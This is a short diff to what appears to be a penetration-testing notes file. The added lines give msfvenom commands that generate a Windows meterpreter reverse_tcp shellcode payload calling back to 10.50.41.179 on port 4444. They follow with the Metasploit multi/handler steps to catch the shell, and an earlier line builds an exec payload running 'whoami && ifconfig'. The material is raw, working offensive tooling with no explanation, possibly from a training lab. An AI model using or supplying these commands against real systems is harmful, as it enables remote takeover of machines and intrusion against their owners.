@@ -58,4 +58,11 @@ set CMD 'whoami && ip a'
 generate -b '\x00' -f python
 msfvenom -p linux/x86/exec CMD="whoami && ifconfig' -b 'x00' -f python
 ----------------------------------------------------------------------------------------------------
-msfvenom -p windows/meterpreter/reverse_tcp lhost=<LIN_OPS> 
+SHELL CODE / PAYLOAD GEN (IGNORE TOP LINE) msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.41.179 lport=4444 -b "\x00" -f python
+  msfconsole
+  use multi/handler
+  show options
+  set payload windows/meterpreter/reverse_tcp
+  set LHOST 0.0.0.0
+  set LPORT 4444
+  exploit (or run)
